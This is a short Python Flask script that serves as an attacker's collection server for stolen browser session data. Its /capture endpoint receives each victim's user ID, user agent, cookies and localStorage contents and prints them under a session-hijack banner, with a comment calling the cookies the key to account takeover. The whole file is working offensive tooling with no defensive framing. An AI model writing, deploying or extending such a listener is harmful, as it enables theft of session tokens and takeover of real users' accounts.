from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    
    if not data:
        return jsonify({"error": "No data"}), 400

    print("\n" + "!"*50)
    print(f"[*] [!!!] SESSION HIJACK DETECTED [!!!] [*]")
    print(f"[*] TIME: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] TARGET USER: {data.get('user_id')}")
    print(f"[*] USER AGENT: {data.get('userAgent')}")
    print("-" * 50)
    
    # The most important part for the takeover
    print(f"[COOKIES]: {data.get('cookies')}")
    print(f"[LOCAL STORAGE]: {data.get('localStorage')}")
    print("-" * 50)
    print("!"*50 + "\n")

    return jsonify({"status": "captured"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
